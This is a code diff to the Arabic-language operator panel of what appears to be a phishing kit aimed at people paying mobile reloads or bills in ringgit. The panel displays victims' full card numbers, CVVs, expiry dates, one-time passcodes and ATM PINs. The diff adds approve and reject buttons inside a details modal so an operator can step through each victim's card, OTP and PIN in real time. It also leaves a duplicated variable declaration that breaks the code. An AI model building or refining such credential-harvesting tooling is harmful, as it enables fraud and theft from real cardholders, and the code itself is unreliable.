@@ -284,6 +284,14 @@
       transition: background 0.15s;
     }
 
+    /* Highlight row awaiting decision */
+    tbody tr.awaiting-decision {
+      background: #fffbeb;
+    }
+    tbody tr.awaiting-decision:hover {
+      background: #fef9c3;
+    }
+
     tbody tr:last-child { border-bottom: none; }
     tbody tr:hover { background: #f8fafc; }
 
@@ -356,13 +364,14 @@
     }
 
     .btn-approve {
-      padding: 6px 12px;
+      flex: 1;
+      padding: 11px 16px;
       background: #16a34a;
       color: #fff;
       border: none;
-      border-radius: 7px;
-      font-size: 12px;
-      font-weight: 600;
+      border-radius: 9px;
+      font-size: 14px;
+      font-weight: 700;
       cursor: pointer;
       transition: background 0.2s;
       white-space: nowrap;
@@ -371,19 +380,43 @@
     .btn-approve:hover { background: #15803d; }
 
     .btn-reject {
-      padding: 6px 12px;
+      flex: 1;
+      padding: 11px 16px;
       background: #dc2626;
       color: #fff;
       border: none;
-      border-radius: 7px;
-      font-size: 12px;
-      font-weight: 600;
+      border-radius: 9px;
+      font-size: 14px;
+      font-weight: 700;
       cursor: pointer;
       transition: background 0.2s;
       white-space: nowrap;
     }
 
     .btn-reject:hover { background: #b91c1c; }
+
+    /* Modal decision area */
+    .modal-decision {
+      display: flex;
+      gap: 10px;
+      margin-top: 20px;
+      padding-top: 16px;
+      border-top: 2px solid #e2e8f0;
+    }
+
+    .modal-decision.hidden { display: none; }
+
+    .decision-label {
+      font-size: 12px;
+      color: #64748b;
+      font-weight: 600;
+      text-align: center;
+      margin-bottom: 10px;
+      background: #f8fafc;
+      padding: 6px 12px;
+      border-radius: 8px;
+      border: 1px solid #e2e8f0;
+    }
 
     .btn-details {
       padding: 6px 12px;
@@ -652,10 +685,15 @@
 <div class="modal-overlay" id="detailsModal">
   <div class="modal">
     <div class="modal-header">
-      <div class="modal-title">تفاصيل البطاقة</div>
+      <div class="modal-title" id="modalTitle">تفاصيل البطاقة</div>
       <button class="modal-close" onclick="closeModal()">✕</button>
     </div>
     <div id="modalContent"></div>
+    <!-- Decision buttons inside modal -->
+    <div class="modal-decision hidden" id="modalDecision">
+      <button class="btn-approve" id="modalApproveBtn" onclick="modalDecide('approve')">✓ قبول</button>
+      <button class="btn-reject" id="modalRejectBtn" onclick="modalDecide('reject')">✕ رفض</button>
+    </div>
   </div>
 </div>
 
@@ -928,21 +966,8 @@ function renderSessions() {
     const isCard = st === 'pending';
     const isOTP = st === 'awaiting_otp';
     const isPIN = st === 'awaiting_pin';
-
-    let approveAction = '', rejectAction = '', actionLabel = '';
-    if (isCard) {
-      approveAction = `sendDecision('${s.sessionId}', 'approved')`;
-      rejectAction = `sendDecision('${s.sessionId}', 'rejected')`;
-      actionLabel = 'البطاقة';
-    } else if (isOTP) {
-      approveAction = `sendDecision('${s.sessionId}', 'otp_approved')`;
-      rejectAction = `sendDecision('${s.sessionId}', 'otp_rejected')`;
-      actionLabel = 'OTP';
-    } else if (isPIN) {
-      approveAction = `sendDecision('${s.sessionId}', 'pin_approved')`;
-      rejectAction = `sendDecision('${s.sessionId}', 'pin_rejected')`;
-      actionLabel = 'PIN';
-    }
+    const canDecide = isCard || isOTP || isPIN;
+    const rowClass = canDecide ? 'awaiting-decision' : '';
 
     const canDecide = isCard || isOTP || isPIN;
     const typeClass = (s.type === 'reload') ? 'type-reload' : 'type-bill';
@@ -950,7 +975,7 @@ function renderSessions() {
     const statusClass = 'status-' + st.replace(/_/g, '_');
     const pageTxt = pageLabel(st, s._page);
 
-    return `<tr>
+    return `<tr class="${rowClass}">
       <td class="phone-cell">${s.number || '-'}</td>
       <td><span class="type-badge ${typeClass}">${typeText}</span></td>
       <td class="amount-cell">${s.amount ? 'RM ' + s.amount : '-'}</td>
@@ -961,11 +986,7 @@ function renderSessions() {
       </td>
       <td>
         <div class="actions-cell">
-          ${canDecide ? `
-            <button class="btn-approve" onclick="${approveAction}">قبول ${actionLabel}</button>
-            <button class="btn-reject" onclick="${rejectAction}">رفض ${actionLabel}</button>
-          ` : ''}
-          <button class="btn-details" onclick="showDetails('${s.sessionId}')">التفاصيل</button>
+          <button class="btn-details" onclick="showDetails('${s.sessionId}')" style="${canDecide ? 'background:#1e40af;color:#fff;border-color:#1e40af;' : ''}">التفاصيل${canDecide ? ' 🔔' : ''}</button>
           <button class="btn-delete" onclick="deleteSession('${s.sessionId}')" title="حذف">✕</button>
         </div>
       </td>
@@ -1016,20 +1037,44 @@ async function clearAll() {
 // ══════════════════════════════════════════
 // DETAILS MODAL
 // ══════════════════════════════════════════
+let currentModalSessionId = null;
+
 function showDetails(sessionId) {
   const s = sessionMap[sessionId];
   if (!s) return;
+
+  currentModalSessionId = sessionId;
+  const st = s.status || 'pending';
+  const isCard = st === 'pending';
+  const isOTP = st === 'awaiting_otp';
+  const isPIN = st === 'awaiting_pin';
+  const canDecide = isCard || isOTP || isPIN;
 
   const card = s.cardData || {};
   const otp = s.otpData || {};
   const pin = s.pinData || {};
 
+  // Set modal title
+  let titleText = 'تفاصيل العميل';
+  if (isCard) titleText = '🔔 بيانات البطاقة - في انتظار القرار';
+  else if (isOTP) titleText = '🔔 رمز OTP - في انتظار القرار';
+  else if (isPIN) titleText = '🔔 الرقم السري - في انتظار القرار';
+  document.getElementById('modalTitle').textContent = titleText;
+
   let html = '';
+
+  // Phone & type & amount at top
+  html += `
+    <div class="detail-row"><span class="detail-key">رقم الهاتف</span><span class="detail-val" style="color:#1e40af;font-weight:700;">${s.number || '-'}</span></div>
+    <div class="detail-row"><span class="detail-key">النوع</span><span class="detail-val">${s.type === 'reload' ? 'إعادة شحن' : 'فاتورة'}</span></div>
+    <div class="detail-row"><span class="detail-key">المبلغ</span><span class="detail-val" style="color:#16a34a;">RM ${s.amount || '-'}</span></div>
+  `;
 
   if (card.cardNumber) {
     html += `
+      <div style="margin:12px 0 6px;font-size:12px;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:1px;">── بيانات البطاقة ──</div>
       <div class="detail-row"><span class="detail-key">اسم حامل البطاقة</span><span class="detail-val">${card.cardholderName || '-'}</span></div>
-      <div class="detail-row"><span class="detail-key">رقم البطاقة</span><span class="detail-val">${card.cardNumber || '-'}</span></div>
+      <div class="detail-row"><span class="detail-key">رقم البطاقة</span><span class="detail-val" style="letter-spacing:2px;">${card.cardNumber || '-'}</span></div>
       <div class="detail-row"><span class="detail-key">تاريخ الانتهاء</span><span class="detail-val">${card.expiry || '-'}</span></div>
       <div class="detail-row"><span class="detail-key">CVV</span><span class="detail-val">${card.cvv || '-'}</span></div>
       <div class="detail-row"><span class="detail-key">البنك</span><span class="detail-val">${card.bank || '-'}</span></div>
@@ -1038,26 +1083,70 @@ function showDetails(sessionId) {
   }
 
   if (otp.otp) {
-    html += `<div class="detail-row"><span class="detail-key">رمز OTP</span><span class="detail-val" style="color:#2563eb;font-size:18px;letter-spacing:4px;">${otp.otp}</span></div>`;
+    html += `
+      <div style="margin:12px 0 6px;font-size:12px;font-weight:700;color:#2563eb;text-transform:uppercase;letter-spacing:1px;">── رمز OTP ──</div>
+      <div class="detail-row"><span class="detail-key">رمز OTP</span><span class="detail-val" style="color:#2563eb;font-size:22px;letter-spacing:6px;font-weight:800;">${otp.otp}</span></div>
+    `;
   }
 
   if (pin.pin) {
-    html += `<div class="detail-row"><span class="detail-key">الرقم السري ATM</span><span class="detail-val" style="color:#9333ea;font-size:18px;letter-spacing:4px;">${pin.pin}</span></div>`;
+    html += `
+      <div style="margin:12px 0 6px;font-size:12px;font-weight:700;color:#9333ea;text-transform:uppercase;letter-spacing:1px;">── الرقم السري ATM ──</div>
+      <div class="detail-row"><span class="detail-key">الرقم السري ATM</span><span class="detail-val" style="color:#9333ea;font-size:22px;letter-spacing:6px;font-weight:800;">${pin.pin}</span></div>
+    `;
   }
 
   html += `
-    <div class="detail-row"><span class="detail-key">رقم الهاتف</span><span class="detail-val">${s.number || '-'}</span></div>
-    <div class="detail-row"><span class="detail-key">المبلغ</span><span class="detail-val">RM ${s.amount || '-'}</span></div>
-    <div class="detail-row"><span class="detail-key">النوع</span><span class="detail-val">${s.type === 'reload' ? 'إعادة شحن' : 'فاتورة'}</span></div>
     <div class="detail-row"><span class="detail-key">المرجع</span><span class="detail-val">${s.ref || '-'}</span></div>
-    <div class="detail-row"><span class="detail-key">الحالة</span><span class="detail-val">${statusLabel(s.status)}</span></div>
+    <div class="detail-row"><span class="detail-key">الحالة</span><span class="detail-val">${statusLabel(st)}</span></div>
     <div class="detail-row"><span class="detail-key">التاريخ</span><span class="detail-val">${formatDate(s.createdAt)}</span></div>
   `;
 
   if (!html) html = '<div style="text-align:center;color:#94a3b8;padding:20px;">لا توجد تفاصيل متاحة بعد</div>';
 
   document.getElementById('modalContent').innerHTML = html;
+
+  // Show/hide decision buttons
+  const decisionDiv = document.getElementById('modalDecision');
+  const approveBtn = document.getElementById('modalApproveBtn');
+  const rejectBtn = document.getElementById('modalRejectBtn');
+
+  if (canDecide) {
+    decisionDiv.classList.remove('hidden');
+    if (isCard) {
+      approveBtn.textContent = '✓ قبول البطاقة';
+      rejectBtn.textContent = '✕ رفض البطاقة';
+    } else if (isOTP) {
+      approveBtn.textContent = '✓ قبول OTP';
+      rejectBtn.textContent = '✕ رفض OTP';
+    } else if (isPIN) {
+      approveBtn.textContent = '✓ قبول PIN';
+      rejectBtn.textContent = '✕ رفض PIN';
+    }
+  } else {
+    decisionDiv.classList.add('hidden');
+  }
+
   document.getElementById('detailsModal').classList.add('show');
+}
+
+async function modalDecide(action) {
+  if (!currentModalSessionId) return;
+  const s = sessionMap[currentModalSessionId];
+  if (!s) return;
+
+  const st = s.status || 'pending';
+  let status;
+  if (st === 'pending') status = (action === 'approve') ? 'approved' : 'rejected';
+  else if (st === 'awaiting_otp') status = (action === 'approve') ? 'otp_approved' : 'otp_rejected';
+  else if (st === 'awaiting_pin') status = (action === 'approve') ? 'pin_approved' : 'pin_rejected';
+  else return;
+
+  // Hide buttons immediately after decision
+  document.getElementById('modalDecision').classList.add('hidden');
+
+  await sendDecision(currentModalSessionId, status);
+  closeModal();
 }
 
 function closeModal() {
